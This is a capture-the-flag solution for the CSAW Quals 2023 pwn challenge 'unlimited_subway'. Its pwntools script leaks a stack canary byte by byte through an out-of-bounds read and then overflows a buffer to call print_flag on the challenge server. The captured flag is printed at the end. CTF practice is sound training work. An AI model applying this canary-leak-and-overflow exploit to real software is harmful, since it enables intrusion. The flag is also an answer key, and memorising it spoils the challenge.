[](ctf=csaw-quals-2023)
[](type=pwn,rev)
[](tags=buffer-overflow,canary)
[](tools=pwntools,ida)

```py
from pwn import *
context.log_level = "debug"
context.binary = "./unlimited_subway"


def get(p, idx):
    p.recvuntil('> ')
    p.sendline('V')
    p.recvuntil(': ')
    p.sendline(str(idx))
    p.recvuntil(': ')
    b = int(p.recvline(), 16)
    return b


def exploit():
    p = remote('pwn.csaw.io', 7900) # nc pwn.csaw.io 7900
    x = get(p, 128)
    assert(x==0)
    canary = 0
    canary |= (get(p, 129) << 8)
    canary |= (get(p, 130) << 16)
    canary |= (get(p, 131) << 24)
    payload = b'A'*0x40+p32(canary)+p32(0xdeadbeef)+p32(context.binary.symbols["print_flag"])
    p.recvuntil('> ')
    p.sendline('E')
    p.recvuntil(': ')
    p.sendline(str(len(payload)))
    p.recvuntil(': ')
    p.sendline(payload)
    print(p.recvall())
    p.close()


if __name__ == "__main__":
    exploit()

'''
[+] Receiving all data: Done (58B)
[DEBUG] Received 0x3a bytes:
    'csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}\n'
[*] Closed connection to pwn.csaw.io port 7900
csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}
'''
```